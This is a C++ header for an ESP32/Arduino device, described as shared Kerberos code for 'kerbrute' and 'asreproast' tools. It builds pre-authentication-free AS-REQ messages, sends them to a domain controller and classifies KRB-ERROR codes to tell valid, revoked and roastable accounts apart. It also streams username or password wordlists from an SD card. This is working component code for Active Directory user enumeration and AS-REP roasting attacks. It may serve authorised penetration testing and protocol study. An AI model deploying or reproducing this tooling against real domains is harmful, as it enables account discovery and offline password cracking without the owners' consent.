#pragma once
// Shared Kerberos plumbing for kerbrute and asreproast: DER writer, AS-REQ
// builder, response reader/classifier and a streaming wordlist reader.
#include <Arduino.h>
#include <WiFiClient.h>
#include <SD.h>
#include <esp_random.h>

namespace Krb {

    // ---- DER writer (definite lengths up to 65535) -------------------------
    inline int derLen(uint8_t *out, int len) {
        if (len < 0x80) { out[0] = (uint8_t)len; return 1; }
        if (len < 0x100) { out[0] = 0x81; out[1] = (uint8_t)len; return 2; }
        out[0] = 0x82; out[1] = (uint8_t)(len >> 8); out[2] = (uint8_t)len; return 3;
    }
    inline int derTlv(uint8_t *out, uint8_t tag, const uint8_t *val, int vlen) {
        out[0] = tag;
        int lp = derLen(out + 1, vlen);
        if (vlen > 0) memcpy(out + 1 + lp, val, vlen);
        return 1 + lp + vlen;
    }
    inline int derExplicit(uint8_t *out, int n, const uint8_t *inner, int innerLen) {
        return derTlv(out, 0xA0 | n, inner, innerLen);
    }
    inline int derInt(uint8_t *out, int val) {          // small non-negative INTEGER
        uint8_t v = (uint8_t)val;
        return derTlv(out, 0x02, &v, 1);
    }
    inline int derGeneralString(uint8_t *out, const char *s) {
        return derTlv(out, 0x1B, (const uint8_t *)s, strlen(s));
    }

    // PrincipalName ::= SEQUENCE { name-type[0] INTEGER, name-string[1] SEQUENCE OF GeneralString }
    inline int buildPrincipalName(uint8_t *out, int nameType, const char **parts, int nParts) {
        uint8_t typeTlv[8]; int tlen = derInt(typeTlv, nameType);
        uint8_t typeWrap[12]; int twlen = derExplicit(typeWrap, 0, typeTlv, tlen);
        uint8_t strs[200]; int sp = 0;
        for (int i = 0; i < nParts; ++i) sp += derGeneralString(strs + sp, parts[i]);
        uint8_t strsSeq[210]; int slen = derTlv(strsSeq, 0x30, strs, sp);
        uint8_t strsWrap[220]; int swlen = derExplicit(strsWrap, 1, strsSeq, slen);
        uint8_t body[240]; int bp = 0;
        memcpy(body + bp, typeWrap, twlen); bp += twlen;
        memcpy(body + bp, strsWrap, swlen); bp += swlen;
        return derTlv(out, 0x30, body, bp);
    }

    // AS-REQ without PA-DATA for user@realm, asking for the given etypes (in
    // preference order). 'user' <= 64 and 'realm' <= 128 bytes.
    // Returns the message length, or -1 if it doesn't fit in 'cap'.
    inline int buildAsReq(uint8_t *out, int cap, const String &user, const String &realm,
                          const int *etypes, int nEtypes) {
        uint8_t buf[640]; int bp = 0;

        uint8_t kdcOpt[] = {0x00, 0x00, 0x00, 0x00, 0x00};            // kdc-options: no flags
        uint8_t kdcOptTlv[8]; int kolen = derTlv(kdcOptTlv, 0x03, kdcOpt, sizeof(kdcOpt));
        uint8_t kdcOptWrap[12]; int kowlen = derExplicit(kdcOptWrap, 0, kdcOptTlv, kolen);
        memcpy(buf + bp, kdcOptWrap, kowlen); bp += kowlen;

        const char *cparts[1] = { user.c_str() };                     // cname [1], NT-PRINCIPAL
        uint8_t cnameSeq[260]; int cnlen = buildPrincipalName(cnameSeq, 1, cparts, 1);
        uint8_t cnameWrap[270]; int cnwlen = derExplicit(cnameWrap, 1, cnameSeq, cnlen);
        memcpy(buf + bp, cnameWrap, cnwlen); bp += cnwlen;

        uint8_t realmTlv[160]; int rlen = derGeneralString(realmTlv, realm.c_str());   // realm [2]
        uint8_t realmWrap[170]; int rwlen = derExplicit(realmWrap, 2, realmTlv, rlen);
        memcpy(buf + bp, realmWrap, rwlen); bp += rwlen;

        const char *sparts[2] = { "krbtgt", realm.c_str() };          // sname [3], NT-SRV-INST
        uint8_t snameSeq[260]; int snlen = buildPrincipalName(snameSeq, 2, sparts, 2);
        uint8_t snameWrap[270]; int snwlen = derExplicit(snameWrap, 3, snameSeq, snlen);
        memcpy(buf + bp, snameWrap, snwlen); bp += snwlen;

        const char *till = "20370913024805Z";                          // till [5]
        uint8_t tillTlv[20]; int tilen = derTlv(tillTlv, 0x18, (const uint8_t *)till, strlen(till));
        uint8_t tillWrap[24]; int tiwlen = derExplicit(tillWrap, 5, tillTlv, tilen);
        memcpy(buf + bp, tillWrap, tiwlen); bp += tiwlen;

        uint32_t nonce = esp_random() & 0x7FFFFFFFu;                  // nonce [7]
        uint8_t nb[4] = { (uint8_t)(nonce >> 24), (uint8_t)(nonce >> 16), (uint8_t)(nonce >> 8), (uint8_t)nonce };
        uint8_t nonceTlv[8]; int nlen = derTlv(nonceTlv, 0x02, nb, 4);
        uint8_t nonceWrap[12]; int nwlen = derExplicit(nonceWrap, 7, nonceTlv, nlen);
        memcpy(buf + bp, nonceWrap, nwlen); bp += nwlen;

        uint8_t et[32]; int ep = 0;                                   // etype [8]
        for (int i = 0; i < nEtypes && i < 8; ++i) ep += derInt(et + ep, etypes[i]);
        uint8_t etSeq[40]; int etlen = derTlv(etSeq, 0x30, et, ep);
        uint8_t etWrap[48]; int etwlen = derExplicit(etWrap, 8, etSeq, etlen);
        memcpy(buf + bp, etWrap, etwlen); bp += etwlen;

        uint8_t bodySeq[660]; int bslen = derTlv(bodySeq, 0x30, buf, bp);
        uint8_t bodyWrap[670]; int bwlen = derExplicit(bodyWrap, 4, bodySeq, bslen);

        uint8_t pvnoTlv[4]; int pvlen = derInt(pvnoTlv, 5);           // pvno [1] = 5
        uint8_t pvnoWrap[8]; int pvwlen = derExplicit(pvnoWrap, 1, pvnoTlv, pvlen);
        uint8_t mtTlv[4]; int mtlen = derInt(mtTlv, 10);              // msg-type [2] = AS-REQ
        uint8_t mtWrap[8]; int mtwlen = derExplicit(mtWrap, 2, mtTlv, mtlen);

        uint8_t reqBuf[720]; int reqP = 0;
        memcpy(reqBuf + reqP, pvnoWrap, pvwlen); reqP += pvwlen;
        memcpy(reqBuf + reqP, mtWrap, mtwlen); reqP += mtwlen;
        memcpy(reqBuf + reqP, bodyWrap, bwlen); reqP += bwlen;

        uint8_t reqSeq[730]; int reqSeqLen = derTlv(reqSeq, 0x30, reqBuf, reqP);
        if (1 + 3 + reqSeqLen > cap) return -1;
        return derTlv(out, 0x6A, reqSeq, reqSeqLen);                  // [APPLICATION 10]
    }

    // ---- DER reader ---------------------------------------------------------
    inline bool readTlvAt(const uint8_t *buf, int pos, int bufLen, uint8_t &tag, int &len, int &valOff, int &nextOff) {
        if (pos + 2 > bufLen) return false;
        tag = buf[pos];
        int lb = buf[pos + 1], lp;
        if (lb < 0x80) { len = lb; lp = 1; }
        else {
            int nb = lb & 0x7F;
            if (nb < 1 || nb > 2 || pos + 2 + nb > bufLen) return false;
            int l = 0; for (int i = 0; i < nb; ++i) l = (l << 8) | buf[pos + 2 + i];
            len = l; lp = 1 + nb;
        }
        valOff = pos + 1 + lp;
        nextOff = valOff + len;
        return nextOff <= bufLen;
    }

    // error-code of a KRB-ERROR, or -1 if 'msg' isn't one.
    inline int errorCode(const uint8_t *msg, int len) {
        uint8_t tag; int l, vo, no;
        if (!readTlvAt(msg, 0, len, tag, l, vo, no) || tag != 0x7E) return -1;      // [APPLICATION 30]
        uint8_t seqTag; int seqLen, seqVo, seqNo;
        if (!readTlvAt(msg, vo, no, seqTag, seqLen, seqVo, seqNo)) return -1;
        int pos = seqVo;
        while (pos < seqNo) {
            uint8_t fTag; int fLen, fVo, fNo;
            if (!readTlvAt(msg, pos, seqNo, fTag, fLen, fVo, fNo)) break;
            if (fTag == 0xA6) {                                                      // error-code [6]
                uint8_t iTag; int iLen, iVo, iNo;
                if (readTlvAt(msg, fVo, fNo, iTag, iLen, iVo, iNo) && iLen >= 1)
                    return iLen == 2 ? ((msg[iVo] << 8) | msg[iVo + 1]) : msg[iVo];
                return -1;
            }
            pos = fNo;
        }
        return -1;
    }

    inline bool isAsRep(const uint8_t *msg, int len) {
        uint8_t tag; int l, vo, no;
        return readTlvAt(msg, 0, len, tag, l, vo, no) && tag == 0x6B;                // [APPLICATION 11]
    }

    // KDC_ERR_* values used here
    enum { ERR_C_PRINCIPAL_UNKNOWN = 6, ERR_ETYPE_NOSUPP = 14, ERR_CLIENT_REVOKED = 18,
           ERR_PREAUTH_REQUIRED = 25, ERR_WRONG_REALM = 68 };

    // ---- framed (TCP) I/O -----------------------------------------------------
    inline bool sendFramed(WiFiClient &c, const uint8_t *buf, int len) {
        uint8_t hdr[4] = { (uint8_t)(len >> 24), (uint8_t)(len >> 16), (uint8_t)(len >> 8), (uint8_t)len };
        if (c.write(hdr, 4) != 4) return false;
        return c.write(buf, len) == (size_t)len;
    }

    // Reads one length-prefixed Kerberos message into a heap buffer (caller
    // frees). AS-REPs carry a ticket with a PAC and routinely exceed 1KB, so
    // this is heap-based rather than a small stack buffer. Returns nullptr on
    // timeout/error or if the message is larger than maxLen.
    inline uint8_t *recvFramed(WiFiClient &c, int &outLen, uint32_t timeoutMs, uint32_t maxLen = 16384) {
        uint32_t deadline = millis() + timeoutMs;
        while (c.available() < 4) { if (millis() > deadline || !c.connected()) return nullptr; delay(5); }
        uint8_t h[4]; c.read(h, 4);
        uint32_t len = ((uint32_t)h[0] << 24) | ((uint32_t)h[1] << 16) | ((uint32_t)h[2] << 8) | h[3];
        if (len == 0 || len > maxLen) return nullptr;
        uint8_t *buf = (uint8_t *)malloc(len);
        if (!buf) return nullptr;
        size_t got = 0;
        while (got < len) {
            if (millis() > deadline || !c.connected()) { free(buf); return nullptr; }
            if (c.available()) { int n = c.read(buf + got, len - got); if (n > 0) got += n; }
            else delay(3);
        }
        outLen = (int)len;
        return buf;
    }

    // ---- wordlists, streamed one line at a time ---------------------------------
    // (a full /wordlists file as a vector<String> can exhaust the heap and
    // reboot the board; progress totals come from a counting pass instead)
    inline bool nextWord(File &f, String &out, size_t maxLen) {
        while (f.available()) {
            out = f.readStringUntil('\n');
            out.trim();
            if (out.length() > maxLen) out = out.substring(0, maxLen);
            if (out.length() > 0) return true;
        }
        return false;
    }
    inline uint32_t countWords(const char *path, size_t maxLen) {
        File f = SD.open(path, FILE_READ);
        if (!f) return 0;
        uint32_t n = 0; String w;
        while (nextWord(f, w, maxLen)) ++n;
        f.close();
        return n;
    }

    inline String upperRealm(const String &realm) {
        String r = realm.length() > 128 ? realm.substring(0, 128) : realm;
        r.toUpperCase();                  // AD realms are the upper-cased DNS domain name
        return r;
    }

} // namespace Krb
